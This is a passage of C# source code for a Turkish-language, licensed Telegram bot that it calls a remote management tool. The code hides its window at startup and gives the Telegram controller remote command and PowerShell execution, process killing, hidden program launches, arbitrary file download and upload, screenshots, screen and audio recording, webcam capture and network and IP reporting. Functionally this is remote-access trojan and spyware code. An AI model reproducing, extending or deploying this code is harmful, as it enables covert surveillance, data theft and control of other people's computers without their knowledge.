                    System.IO.File.WriteAllText("./config.txt", exampleConfigFile);
                    MessageBox.Show("config.txt dosyası hatalı olduğu için yeniden oluşturuldu.\nBu dosyaya doğru değerleri girdikten sonra botu yeniden başlatın.\nadminUserID ve bot token harici hiçbir değer zorunlu değildir.\nLakin satır sırasını karıştırmayın.\nProxy kullanmıyorsanızda disabled olarak kalsın.");
                    Environment.Exit(0);
                }
                else if (proxy != null)
                {
                    if (resolveHostnamesLocally == "true")
                        proxy.ResolveHostnamesLocally = true;
                    else proxy.ResolveHostnamesLocally = false;
                }
                HttpClient httpClient = new HttpClient(new HttpClientHandler { Proxy = proxy, UseProxy = true, });
                istemci = new TelegramBotClient(botToken, httpClient);
            }
            else
            {
                try
                { istemci = new TelegramBotClient(botToken); }
                catch (Exception ex)
                {
                    MessageBox.Show($"{ex}");
                    //Environment.Exit(0);
                }
            }
            #endregion
            if (!Application.OpenForms.OfType<Form1>().Any())
            {
                Form form1 = new Form1(); // Your main form
                form1.Show();
                form1.WindowState = FormWindowState.Normal;
                form1.Focus();
                form1.Activate();
                if (botToken != null && botToken != "" && botToken != " " && botToken != "bot_paste_token")
                {
                    form1.WindowState = FormWindowState.Minimized;
                    form1.Hide();
                }
            }
            else if (Application.OpenForms.OfType<Form1>().Any())
            {
                Form1 f1 = Application.OpenForms["Form1"] as Form1;
                f1.Show();
                f1.WindowState = FormWindowState.Normal;
                f1.Focus();
                f1.Activate();
                if (botToken != null && botToken != "" && botToken != " " && botToken != "bot_paste_token")
                {
                    f1.WindowState = FormWindowState.Minimized;
                    f1.Hide();
                }

            }
            try
            {
                if (logMessages) log("Uygulama hata ayıklama modu ile başlatıldı!\nBu modda bilgisayar ekranında bazı mesajlar belirebilir.\nFonksiyonlar çalışırken uyarılar ve MessageBoxlar gelebilir!");
            }
            catch (Exception)
            {
                //MessageBox.Show(ex.ToString());
            }
            try
            {/*licenseQuery();*/
                #pragma warning disable CS4014 // Beklemeyelim
                                checkUserIDLicense(adminUserID);
                #pragma warning restore CS4014 // Beklemeyelim


            }
            catch (Exception ex) { MessageBox.Show(ex.ToString()); }
            try
            {
                if (botToken!=null)
                {
                    startBot();
                }
                
            }
            catch (Exception)
            {
                MessageBox.Show("Bot tokeniniz yanlış!");
            }
        }
        public static string RandomString(int length, string charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890")
        {
            return new string(GenerateChars(charset).Take(length).ToArray());
        }
        public static IEnumerable<char> GenerateChars(string charset)
        {
            if (charset == null)
                throw new ArgumentNullException(nameof(charset));

            while (true)
            {
                yield return charset[_random.Next(charset.Length)];
            }
        }
        public static void startBot()
        {
            #region Telegram Botunu Başlat
            #pragma warning disable CS4014 // Bu çağrı beklenmediği için, çağrı tamamlanmadan önce geçerli yöntemin yürütülmesine devam ediliyor
            try
            {
                //Thread bot = new Thread(() => Client_MessageLoopAsync());
                //bot.Start();
                Client_MessageLoopAsync();
                 //Beklemeye gerek yok. Task olarak çalışacağı için.
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
                if (logMessages)
                {
                    MessageBox.Show(ex.ToString());
                }
                
            }
            
            #pragma warning restore CS4014 // Bu çağrı beklenmediği için, çağrı tamamlanmadan önce geçerli yöntemin yürütülmesine devam ediliyor
            #endregion
        }
        delegate Task<string> MethodDelegate();
        //Bunu başka bir formdaki metodu çalıştırma örneği olarak saklayalım
        private static async Task licenseQuery()
        {
            #region Lisans Doğrulama
            try
            {
                //hasLicense = false;
                //Form1 f1 = new Form1();
                //string result = await f1.lisansAnahtariKontroluAsync();
                Form1 f1 = Application.OpenForms["Form1"] as Form1;
                if (f1!=null&&f1.InvokeRequired)
                {
                    MethodDelegate licChk = new MethodDelegate(f1.lisansAnahtariKontroluAsync);
                    f1.Invoke(licChk);
                }
                
                //if (result == "boş_alan_uyarısı") hasLicense=false;
                //else if (result == "key_geçersiz") hasLicense=false;
                //else if (result == "key_karalistede") hasLicense=false;
                //else if (result == "internet_yok") hasLicense=false;
                //if (result == "key_geçerli") { hasLicense = true; }
                //else hasLicense=false;
                rea = Form1.rea;
                await licenseQuery();
            }
            catch (Exception ex){ if(logMessages)MessageBox.Show($"{ex}"); }
            #endregion
        }

        #region Telegram Mesajlarını Almak İçin Gerekli Loop Metod
        static public async Task Client_MessageLoopAsync()
        {
            var cts = new CancellationTokenSource();
            var cancellationToken = cts.Token;
            var receiverOptions = new ReceiverOptions
            {
                AllowedUpdates = { }
            };
            try
            {
                await istemci.ReceiveAsync(
                    HandleUpdateAsync,
                    HandleErrorWrapperAsync,
                    receiverOptions,
                    cancellationToken
                    );
            }
            catch (Exception ex)
            { if (logMessages) log("Error: Client_MessageLoopAsync:"+ex.ToString()); }
        }
        static async Task HandleUpdateAsync(ITelegramBotClient istemci, Update update, CancellationToken cancellationToken)
        {
            if (update.Message is Message message)
                await HandleRequestAsync(message);
        }
        static async Task HandleErrorAsync(ITelegramBotClient istemci, Exception exception, CancellationToken cancellationToken, Message e)
        {
            if (exception is ApiRequestException apiRequestException)
                await istemci.SendTextMessageAsync(e.Chat.Id, apiRequestException.ToString());
        }
        static async Task HandleErrorWrapperAsync(ITelegramBotClient istemci, Exception exception, CancellationToken cancellationToken)
        {
            if (exception is ApiRequestException apiRequestException)
                await HandleErrorAsync(istemci, apiRequestException, cancellationToken, null);
        }
        #endregion
        #region Telegram Mesajlarını İşlemek İçin Gerekli Metod
        static async Task HandleRequestAsync(Message e)
        {
            try
            {
                #region Yerel Değişkenler
                string chatID;
                string userID;
                string msg;
                string userName;
                string name = "", surname = "", chatName = "", output = " ";
                DateTime msgSendTime;
                int msgID = e.MessageId;
                name = e.From.FirstName;
                surname = e.From.LastName;
                userID = e.From.Id.ToString();
                msg = e.Text.ToString();
                chatID = e.Chat.Id.ToString();
                msgSendTime = e.Date;
                chatName = e.Chat.Title;
                userName = "";
                try { userName = e.From.Username.ToString() + " "; }
                catch (Exception) { userName = ""; }
                #endregion
                #region Mesajları text dosyasına logla
                if (logMessages) log($"________________________\nChatAdı:{chatName}\nMesaj Zamanı:{msgSendTime}\nChatID:{chatID}\nUserID:{userID}\nMsgID:{msgID}\nAd:{name}\nSoyad:{surname}\nKullanıcı Adı:{userName}\nMesaj:{msg}"); 
                #endregion
                if (msgID.ToString() == "" || msgID.ToString() == " ")
                    return;
                if (!botReset)
                {
                    await istemci.SendTextMessageAsync(chatID, $"💾2024 ny4rlk0, Telegram Uzaktan Yönetim Yazılımı başlatıldı.\n💾/menü yazarak menüyü açabilirsiniz (v24.03.9).");
                    botReset = true;
                    return;
                }
                if (delay)
                {
                    await Task.Delay(delayTime);
                }
                if (msg.StartsWith("/delay"))
                {
                    #region komutlar arası bekleme mantığı
                    if (msg=="/delay")
                    {
                        delay = !delay;
                        await istemci.SendTextMessageAsync(chatID, $"/delay komutlar arası bekleme özelliğini aktifleştirir.\n/delay 60 komutu, saniye cinsinden bir süre alarak bu süre kadar bekler her komutunuzu çalıştırmadan önce.\nKapatmak için tekrar /delay yazın.");
                        if (delay) await istemci.SendTextMessageAsync(chatID, $"Bot komutları arası bekleme aktifleştirildi!(delay:{delay})\n/delay 60 gibi bir komut yazarak beklenecek süreyi belirleyin ve bunu delay.txt dosyasına kaydedin!");
                        else if (!delay) { await istemci.SendTextMessageAsync(chatID, $"Bot komutları arası bekleme kapatıldı!(delay:{delay})\ndelay.txt dosyası silindi.\nArtık her başlangıçta komutlar arasında beklenmeyecek!"); }
                        return;
                    }
                    msg = msg.Replace("/delay","");
                    try
                    {
                        delayTime=TimeSpan.FromSeconds(Convert.ToInt32(msg));
                        if (System.IO.File.Exists("./delay.txt"))
                            System.IO.File.Delete("./delay.txt");
                        if (!System.IO.File.Exists("./delay.txt"))
                        {
                            System.IO.File.WriteAllText("./delay.txt", contents: $"{msg}");
                            await istemci.SendTextMessageAsync(chatID, $"Bot komutları arası bekleme süresi {msg} saniye delay.txt dosyasına yazıldı!\nArtık her başlangıçta komutlar arasında beklenecek!");
                        }
                        else
                        {
                            await istemci.SendTextMessageAsync(chatID, $"Bot komutları arası bekleme süresi {msg} saniye olarak ayarlandı!");
                        }
                        return;
                    }
                    catch (Exception ex)
                    {
                        if(logMessages) await istemci.SendTextMessageAsync(chatID, $"/delay Hata:{ex}");
                        return;
                    }
                    #endregion
                }
                if (msg.StartsWith("/userid"))
                {
                    #region Kullanıcının telegramdaki userID kimliğini yollayalım
                    await istemci.SendTextMessageAsync(chatID, $"Senin userID:{userID}", replyToMessageId: msgID);
                    return;
                    #endregion
                }
                else if ((msg == ("/aktifleştir") || msg == ("/activate") || msg == "/act" || msg=="/lic" ||msg=="/chk"||msg=="/yazılım_aktivasyon_durumu"||msg== "/✅️act") &&userID==adminUserID)
                {
                    #region Lisans kontrolü
                    bool lic =await checkUserIDLicense(adminUserID);
                    if (!hasLicense)
                    {
                        if (rea == "") rea = "Yok";
                        if (!lic) await istemci.SendTextMessageAsync(chatID, $"❎️Lisansınız❎️:\n{adminUserID}\nSatın alınmış lisanslar arasında bulunamadı!\nYeni aktive edildiyse 10-20 dakika aktivasyon sunucularını beklemelisiniz!\nconfig.txt dosyasına userID'nizi ekleyin!\nSatın aldıktan sonra user ID nizi Discord sunucumuza gelip bize bildirin! Discord: https://discord.gg/GKS2Q7Er3u", replyToMessageId: msgID);
                        else if (lic) { hasLicense = true; await istemci.SendTextMessageAsync(chatID, $"✅️Lisansınız aktif!✅️\nHerhangi bir sorun bulunmamaktadır!", replyToMessageId: msgID); }
                        return;
                    }
                    else if (hasLicense) await istemci.SendTextMessageAsync(chatID, $"✅️Lisansınız aktif!✅️\nHerhangi bir sorun bulunmamaktadır!", replyToMessageId: msgID);
                    return;
                    #endregion
                }
                else if (!hasLicense)
                {
                    bool lic = await checkUserIDLicense(adminUserID);
                    if (!lic) await istemci.SendTextMessageAsync(chatID, $"❎️Lisansınız❎️:\n{adminUserID}\nSatın alınmış lisanslar arasında bulunamadı!\nYeni aktive edildiyse 10-20 dakika aktivasyon sunucularını beklemelisiniz!\nconfig.txt dosyasına userID'nizi ekleyin!\nSatın aldıktan sonra user ID nizi Discord sunucumuza gelip bize bildirin! Discord: https://discord.gg/GKS2Q7Er3u", replyToMessageId: msgID);
                    else if (lic) { hasLicense = true; await istemci.SendTextMessageAsync(chatID, $"✅️Lisansınız aktif!✅️\nHerhangi bir sorun bulunmamaktadır!", replyToMessageId: msgID); }
                    return;
                }
                #region Sadece userID'si eşleşen kullanıcı botu kontrol edebilsin
                if (userID != adminUserID)
                {
                    await istemci.SendTextMessageAsync(chatID, $"Senin userID:\n{userID}\nYetkili kullanıcı:\n{adminUserID}\nAdmin yetkin yok!\nconfig.txt dosyasına userID'ni ekle!", replyToMessageId: msgID);
                    return;
                }
                #endregion
                if (msg.StartsWith("/uuid ")&&msg!="/uuid get"&&msg!="/uuid set"||msg.StartsWith("/uuid clear")||msg=="/uuid gen")
                {
                    if (msg.StartsWith("/uuid clear"))
                    {
                        string chk2 = msg.Replace("/uuid clear ", "");
                        if (System.IO.File.Exists("./uuid") && uuid == chk2)
                        {
                            System.IO.File.Delete("./uuid");
                            uuid = null;
                            await istemci.SendTextMessageAsync(chatID, $"Bilgisayarın uuid değeri kaldırıldı!", replyToMessageId: msgID);
                        }
                        return; 
                    }
                    else if (msg=="/uuid gen")
                    {
                        if (System.IO.File.Exists("./uuid")) System.IO.File.Delete("./uuid");
                        string randomString = RandomString(10);
                        uuid = randomString;
                        System.IO.File.WriteAllText("./uuid",uuid);
                        await istemci.SendTextMessageAsync(chatID, $"Bilgisayarınıza uuid({uuid}) değeri oluşturuldu!", replyToMessageId: msgID);
                        return;

                    }
                    string chk = msg.Replace("/uuid ","");
                    string[] tempList = chk.Split(null);
                    string queryUUID = tempList[0];
                    if (uuid!=null) {
                        if (uuid==queryUUID) { msg = msg.Replace("/uuid ", "");msg = msg.Replace(uuid+" ",""); await istemci.SendTextMessageAsync(chatID, $"{uuid} uuid değerine sahip bilgisayara {msg} komutunu gönderdiniz!", replyToMessageId: msgID); }
                    }
                }
                if (msg.StartsWith("/key") || msg.StartsWith("/menu") || msg.StartsWith("/menü")||msg== "/⬅️menü")
                {
                    await istemci.SendTextMessageAsync(chatID, $"📜Ana Menü açılıyor📜", replyToMessageId: msgID);
                    IReplyMarkup rkm = new ReplyKeyboardMarkup(
                    new KeyboardButton[][]
                    {
                    new KeyboardButton[]
                    {
                        new KeyboardButton("📜2024 ny4rlk0📜")
                    },
                    new KeyboardButton[]
                    {
                        new KeyboardButton("/🎤🎧📸📹"),
                        new KeyboardButton("/💻🖥🖱⌨️"),
                        new KeyboardButton("/⚙️başlat")
                    },
                    new KeyboardButton[] 
                    {
                        new KeyboardButton("/✅️act"),
                        new KeyboardButton("/🛰🗺ip"),
                        new KeyboardButton("/⬇️⬆️💻")
                    },
                    new KeyboardButton[]
                    {
                        new KeyboardButton("/❌️👻"),
                        new KeyboardButton("/✅️👻")
                    },
                    new KeyboardButton[]
                    {
                        new KeyboardButton("/❌️exit")
                    }
                    })
                    { ResizeKeyboard = true };
                    await istemci.SendTextMessageAsync(chatID, msg, disableWebPagePreview: false, disableNotification: false, protectContent: false, allowSendingWithoutReply: false, replyMarkup: rkm);
                    return;
                }
                else if (msg==("/kayıt_menü") || msg== "/🎤🎧📸📹")
                {
                    await istemci.SendTextMessageAsync(chatID, $"🎤🎧Kayıt alma menüsü açılıyor📸📹", replyToMessageId: msgID);
                    IReplyMarkup rkm = new ReplyKeyboardMarkup(
                    new KeyboardButton[][]
                    {
                    new KeyboardButton[] {
                        new KeyboardButton("/⬅️menü"),
                        new KeyboardButton("/✏️📖📝log")

                    },
                    new KeyboardButton[] {
                        new KeyboardButton("/💻📸"),
                        new KeyboardButton("/💻📹video 1")
                    },
                    new KeyboardButton[] {
                        new KeyboardButton("🎙🎤🎧audio 1")
                    },
                    new KeyboardButton[]
                    {
                        new KeyboardButton("/📸snapwebcam"),
                    },
                    new KeyboardButton[]
                    {
                        new KeyboardButton("/📹recordwebcam 1")
                    }
                    })
                    { ResizeKeyboard = true };
                    await istemci.SendTextMessageAsync(chatID, msg, disableWebPagePreview: false, disableNotification: false, protectContent: false, allowSendingWithoutReply: false, replyMarkup: rkm);
                    return;
                }
                else if (msg == ("/komut_menü") ||msg== "/💻🖥🖱⌨️")
                {
                    await istemci.SendTextMessageAsync(chatID, $"💻🖥Komut alma menüsü açılıyor🖱⌨️", replyToMessageId: msgID);
                    IReplyMarkup rkm = new ReplyKeyboardMarkup(
                    new KeyboardButton[][]
                    {
                    new KeyboardButton[] {
                        new KeyboardButton("/⬅️menü")
                    },
                    new KeyboardButton[] {
                        new KeyboardButton("/cmd"),
                        new KeyboardButton("/ps"),
                        new KeyboardButton("/kill")
                    }
                    })
                    { ResizeKeyboard = true };
                    await istemci.SendTextMessageAsync(chatID, msg, disableWebPagePreview: false, disableNotification: false, protectContent: false, allowSendingWithoutReply: false, replyMarkup: rkm);
                    return;
                }
                if (msg == ("/başlat_menü")||msg== "/⚙️başlat")
                {
                    await istemci.SendTextMessageAsync(chatID, $"⚙️Başlangıçta başlatma menüsü açılıyor⚙️", replyToMessageId: msgID);
                    IReplyMarkup rkm = new ReplyKeyboardMarkup(
                    new KeyboardButton[][]
                    {
                    new KeyboardButton[] {
                        new KeyboardButton("/⬅️menü")
                    },
                    new KeyboardButton[] {
                        new KeyboardButton("/✅️logon✅️"),
                        new KeyboardButton("/❌️logon❌️")
                    },
                    new KeyboardButton[]
                    {
                        new KeyboardButton("/✅️start✅️"),
                        new KeyboardButton("/❌️start❌️")
                    }
                    })
                    { ResizeKeyboard = true };
                    await istemci.SendTextMessageAsync(chatID, msg, disableWebPagePreview: false, disableNotification: false, protectContent: false, allowSendingWithoutReply: false, replyMarkup: rkm);
                    return;
                }
                if (msg.StartsWith("/cmd ") || msg == "/cmd")
                {
                    #region Komut satırında komut çalıştırma mantığı
                    if (msg == "/cmd " || msg == "/cmd")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"/cmd ne?\nKomut yaz sonuna.\n/cmd \"echo abc gibi\"", replyToMessageId: msgID);
                        return;
                    }

                    //await istemci.SendTextMessageAsync(chatID,$"{userName}Komut Çalıştırıldı!", replyToMessageId: msgID);
                    msg = msg.Replace("/cmd ", "");
                    output = cmd(msg);
                    //await istemci.SendTextMessageAsync(chatID, $"{msg}", replyToMessageId: msgID);
                    await istemci.SendTextMessageAsync(chatID, $"{output}", replyToMessageId: msgID);
                    #endregion
                }
                else if (msg.StartsWith("/ps ") || msg == "/ps")
                {
                    #region Powershell komut çalıştırma mantığı
                    if (msg == "/ps " || msg == "/ps")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"/ps ne?\nKomut yaz sonuna.\n/ps \"echo abc gibi\"", replyToMessageId: msgID);
                        return;
                    }
                    msg = msg.Replace("/ps ", "");
                    output = ps(msg);
                    await istemci.SendTextMessageAsync(chatID, $"{output}", replyToMessageId: msgID);
                    #endregion
                }
                else if (msg=="/ss"||msg== "/💻📸")
                {
                    #region Tüm ekranların tek tek ekran alıntısını alma mantığı 
                    foreach (var screen in Screen.AllScreens) //Tüm ekranların sırayla alıntısını alıp gönderelim
                    {
                        //Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                        //using (Graphics graphics = Graphics.FromImage(screenshot))
                        //    graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
                        Bitmap screenshot = new Bitmap(screen.Bounds.Width, screen.Bounds.Height);
                        using (Graphics graphics = Graphics.FromImage(screenshot))
                            graphics.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, 0, 0, screenshot.Size);
                        screenshot.Save("temp.png", System.Drawing.Imaging.ImageFormat.Png);
                        var stream = InputFile.FromStream(System.IO.File.OpenRead("./temp.png"), fileName: "temp.png");
                        await istemci.SendDocumentAsync(chatID, stream, replyToMessageId: msgID);
                        try { System.IO.File.Delete("./temp.png"); }
                        catch (Exception ex) { await istemci.SendTextMessageAsync(chatID, ex.ToString(), replyToMessageId: msgID); }
                    }
                    #endregion
                }
                else if (msg=="/log"||msg== "/✏️📖📝log")
                {
                    #region Sohbette atılan mesajları yazı olarak log.txt dosyasına kaydetme mantığı
                    logMessages = !logMessages;
                    string mesaj = "";
                    if (logMessages)
                        mesaj = "/log komutunu çalıştırdığın için bundan sonraki tüm sohbet yazıları log.txt dosyasına kaydedilecek ve Hatalar mesaj olarak ya da bilgisayarda MessageBox ileti kutusu olarak gösterilecek!";
                    else if (!logMessages)
                        mesaj = "/log komutunu tekrar kullandın.Bu mesajdan sonraki tüm sohbet yazıları artık kaydedilmeyecek!";
                    await istemci.SendTextMessageAsync(chatID, mesaj, replyToMessageId: msgID);
                    #endregion
                }
                else if (msg=="/ip"||msg== "/🌍🌎🛰🗺"||msg== "/🛰🗺ip")
                {
                    #region Etkin internet kartlarının ve ip adreslerinin bilgisini alma mantığı
                    NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
                    foreach (NetworkInterface adapter in adapters)
                    {
                        string aname = adapter.Name.ToString();
                        string mac = adapter.GetPhysicalAddress().ToString().Trim();
                        string desc = adapter.Description.ToString().Trim();
                        string guid = adapter.Id.ToString();
                        string ip = "";
                        string external_ip = "";
                        using (HttpClient client = new HttpClient())
                            external_ip = await client.GetStringAsync("https://api64.ipify.org?format=text");
                        foreach (UnicastIPAddressInformation ipInfo in adapter.GetIPProperties().UnicastAddresses)
                            if (ipInfo.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                                ip = ipInfo.Address.ToString();
                        if (mac != null && mac != " " && mac != "" && adapter.OperationalStatus == OperationalStatus.Up)
                        {
                            if (logMessages) log($"Adapter Name:{aname}");
                            if (logMessages) log($"DESC:{desc}");
                            if (logMessages) log($"GUID:{guid}");
                            if (logMessages) log($"MAC:{mac}");
                            if (logMessages) log($"Yerel Ağ IP:{ip}");
                            if (logMessages) log($"İnternet IP:{external_ip}\n");
                            await istemci.SendTextMessageAsync(chatID, $"Adapter Name:{aname}\nDESC:{desc}\nGUID:{guid}\nMAC:{mac}\nYerel Ağ IP:{ip}\nİnternet IP:{external_ip}\n", replyToMessageId: msgID);
                        }
                    }
                    #endregion
                }
                else if (msg== "📜2024 ny4rlk0📜")
                {
                    #region Bot hakkinda bilgi
                    List<string> tempList = new List<string> { };
                    tempList.Clear();
                    try
                    {
                        int chunkSize = 4096;
                        for (int i = 0; i < hakkinda.Length; i += chunkSize)
                        {
                            string chunk = hakkinda.Substring(i, Math.Min(chunkSize, hakkinda.Length - i));
                            tempList.Add(chunk);
                        }
                        foreach (var item in tempList)
                        {
                            await istemci.SendTextMessageAsync(chatID, $"{item}", replyToMessageId: msgID);
                            Thread.Sleep(200);
                        }
                        return;
                    }
                    catch (Exception ex)
                    {
                        if (logMessages)
                            await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID); 
                    }
                    return;
                    #endregion
                }
                else if (msg.StartsWith("/download ")||msg.StartsWith("/⬇️⬆️💻"))
                {
                    #region Linki atılan dosyayı indirme matığı
                    if (msg== "/⬇️⬆️💻")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"Bilgisayara dosya yüklemek için:\n/download link.\nBilgisayardan dosya indirmek için:\n/upload link.\nUpload yaparken telegramın belirlediği 50 mb limit var!", replyToMessageId: msgID);
                        return;
                    }
                    msg = msg.Replace("/download ", "");
                    if (msg == "/download " || msg == "/download")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"/download ne?\nLink yaz sonuna.\n/download \"https://abc.com/a.txt  gibi.\"", replyToMessageId: msgID);
                        return;
                    }
                    using (WebClient cli = new WebClient())
                    {
                        try
                        {
                            Uri uri = new Uri(msg);
                            string fileName = System.IO.Path.GetFileName(uri.LocalPath);
                            await cli.DownloadFileTaskAsync(msg, "./" + fileName);
                            await istemci.SendTextMessageAsync(chatID, $"Dosyan başarıyla programla aynı klasöre indirildi.\n({fileName})", replyToMessageId: msgID);
                            return;

                        }
                        catch (Exception ex)
                        { await istemci.SendTextMessageAsync(chatID, $"Dosya indirilirken hata oluştu.\n{ex}", replyToMessageId: msgID);return; }
                    }
                    #endregion
                }
                else if (msg.StartsWith("/upload "))
                {
                    #region 50 MB kadar bilgisayarda bulunan dosyayı telegrama yükleme mantığı
                    msg = msg.Replace("/upload ", "");
                    try
                    {
                        string filename = "";
                        if (msg.Contains("\\") || msg.Contains("/"))
                            filename = System.IO.Path.GetFileName(msg);
                        else filename = msg;
                        var stream = InputFile.FromStream(System.IO.File.OpenRead(msg), fileName: filename);
                        await istemci.SendDocumentAsync(chatID, stream, replyToMessageId: msgID);
                        await istemci.SendTextMessageAsync(chatID, $"Dosyan başarıyla Telegrama yüklendi.", replyToMessageId: msgID);
                        return;
                    }
                    catch (Exception ex)
                    {
                        await istemci.SendTextMessageAsync(chatID, $"Dosya yüklerken hata oluştu. Dosya 50 MB büyük olmamalı.\n{ex}", replyToMessageId: msgID);
                        return;
                    }
                    #endregion
                }
                else if (msg.StartsWith("/kill ") || msg.StartsWith("/taskkill ")||msg=="/kill")
                {
                    #region Bilgisayarda çalışan bir işlemin dosya adını, uzantısını  vermeden sonlandırma mantığı
                    if (msg=="/kill")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"/kill ne reis işlem program ismi yaz. Boşluksuz.\n/kill explorer mesela.", replyToMessageId: msgID);
                        return;
                    }
                    if (msg.StartsWith("/kill "))
                        msg = msg.Replace("/kill ", "");
                    else if (msg.StartsWith("/taskkill "))
                        msg = msg.Replace("/taskkill ", "");
                    try
                    {
                        #region botun sürekli kapanmasına yol açan bir bugfix #1
                        if (msg == "TelegramRemoteAccessBot" || msg.ToLower() == "telegramremoteaccessbot")
                        {
                            await istemci.SendTextMessageAsync(chatID, "Bunu yapmak botun sürekli kapanmasına neden olan bir hataya yol açıyor!\nBu mesaj silinmeden bot düzelmiyor!\nKomut reddedildi!", replyToMessageId: msgID);
                            return;
                        }
                        #endregion
                        Process[] proc = Process.GetProcessesByName(msg);
                        foreach (Process p in proc)
                            p.Kill();
                        if (proc.Length <= 0)
                            await istemci.SendTextMessageAsync(chatID, "İşlem bulunamadı!", replyToMessageId: msgID);
                        else if (proc.Length >= 1)
                            await istemci.SendTextMessageAsync(chatID, $"İşlem başarıyla sonlandırıldı!", replyToMessageId: msgID);
                    }
                    catch (Exception ex)
                    {
                        await istemci.SendTextMessageAsync(chatID, $"İşlem sonlandırılırken hatayla karşılaşıldı!{ex}", replyToMessageId: msgID);
                        return;
                    }
                    return;
                    #endregion
                }
                else if (msg.StartsWith("/start ") || msg == "/start")
                {
                    #region Yeni bir işlemi arkaplanda çalıştırma mantığı
                    if (msg == "/start " || msg == "/start")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"/start ne?\nKomut yaz sonuna.\n/start \"C:\\CMD.exe gibi\"\n/starto komutu ön planda çalıştırır.\n/start ise arkaplanda çalıştırır.", replyToMessageId: msgID);
                        return;
                    }
                    msg = msg.Replace("/start ", "");
                    try
                    {
                        Process p = new Process();
                        p.StartInfo.FileName = "CMD.EXE";
                        p.StartInfo.Arguments = $"/C start \"\" \"{msg}\"";
                        p.StartInfo.RedirectStandardError = false;
                        p.StartInfo.RedirectStandardOutput = false;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.Start();
                        p.WaitForExit();
                        await istemci.SendTextMessageAsync(chatID, $"Arkaplanda başlatıldı!", replyToMessageId: msgID);
                        return;
                    }
                    catch (Exception ex) { await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID);return; }
                    #endregion
                }
                else if (msg.StartsWith("/starto ") || msg == "/starto")
                {
                    #region Yeni bir işlemi önplanda çalıştırma mantığı
                    if (msg == "/starto " || msg == "/starto")
                    {
                        await istemci.SendTextMessageAsync(chatID, $"/starto ne?\nKomut yaz sonuna.\n/starto \"C:\\CMD.exe gibi\"", replyToMessageId: msgID);
                        return;
                    }
                    msg = msg.Replace("/starto ", "");
                    try
                    {
                        Process p = new Process();
                        p.StartInfo.FileName = "CMD.EXE";
                        p.StartInfo.Arguments = $"/C start \"\" \"{msg}\"";
                        p.StartInfo.RedirectStandardError = false;
                        p.StartInfo.RedirectStandardOutput = false;
                        p.StartInfo.CreateNoWindow = false;
                        p.StartInfo.UseShellExecute = false;
                        p.Start();
                        p.WaitForExit();
                        await istemci.SendTextMessageAsync(chatID, $"Ön planda başlatıldı!", replyToMessageId: msgID);
                        return;
                    }
                    catch (Exception ex) { await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID); return; }
                    #endregion
                }
                else if (msg.StartsWith("/video") || msg.StartsWith("/video ")||msg.StartsWith("/💻📹video "))
                {
                    #region Ekran kaydetme mantığı (yalnızca ana ekran)
                    TimeSpan videoTimeLength = TimeSpan.FromSeconds(60);
                    if (msg.StartsWith("/video "))
                    {
                        msg = msg.Replace("/video ", "");
                        await istemci.SendTextMessageAsync(chatID, "60 saniyelik video kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları video kaydı bittiğinde çalıştırılacaktır!\nMesela /video 3 size 60 saniyelik 3 tane ayrı video mesajı yollar yani 3 dk lık video.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    }
                    else if (msg.StartsWith("/💻📹video "))
                    {
                        msg = msg.Replace("/💻📹video ", "");
                        await istemci.SendTextMessageAsync(chatID, "60 saniyelik video kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları video kaydı bittiğinde çalıştırılacaktır!\nMesela /video 3 size 60 saniyelik 3 tane ayrı video mesajı yollar yani 3 dk lık video.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    }
                    else if (msg.StartsWith("/video"))
                        await istemci.SendTextMessageAsync(chatID, "60 saniyelik video kaydı başlatıldı\nBu süre içerisinde yazdığınız bot komutları video kaydı bittiğinde çalıştırılacaktır!\nMesela /video 3 size 60 saniyelik 3 tane ayrı video mesajı yollar yani 3 dk lık video.\nBu sürede botu kullanamazsınız!", replyToMessageId: msgID);
                    try
                    {
                        int repeat = Convert.ToInt32(msg);
                        for (int i = 1; i <= repeat; i++)
                        {
                            if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                            string filePath2 = await CreateRecordingAsync(videoTimeLength);
                            var stream2 = InputFile.FromStream(System.IO.File.OpenRead("./temp.mp4"), fileName: "temp.mp4");
                            await istemci.SendVideoAsync(chatID, stream2, replyToMessageId: msgID, caption: $"{i}/{repeat} Video, {(repeat * 60) / 60} Dakika");
                        }
                    }
                    catch (Exception)
                    {
                        if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                        string filePath = await CreateRecordingAsync(videoTimeLength);
                        var stream = InputFile.FromStream(System.IO.File.OpenRead("./temp.mp4"), fileName: "temp.mp4");
                        await istemci.SendVideoAsync(chatID, stream, replyToMessageId: msgID, caption: $"1/1 Video, 1 Dakika");
                    }
                    try
                    {
                        if (System.IO.File.Exists("./temp.mp4")) System.IO.File.Delete("./temp.mp4");
                    }
                    catch (Exception ex) { await istemci.SendTextMessageAsync(chatID, $"{ex}", replyToMessageId: msgID); }
                    return;
                    #endregion
                }
                else if (msg.StartsWith("/audio") || msg.StartsWith("/audio ") || msg.StartsWith("/ses") || msg.StartsWith("/ses ")||msg.StartsWith("/🎙🎤🎧audio "))
                {
                    #region Ses kaydetme mantığı
                    TimeSpan audioTimeLength = TimeSpan.FromSeconds(60);
                    if (msg.StartsWith("/audio "))
                    {
                        msg = msg.Replace("/audio ", "");
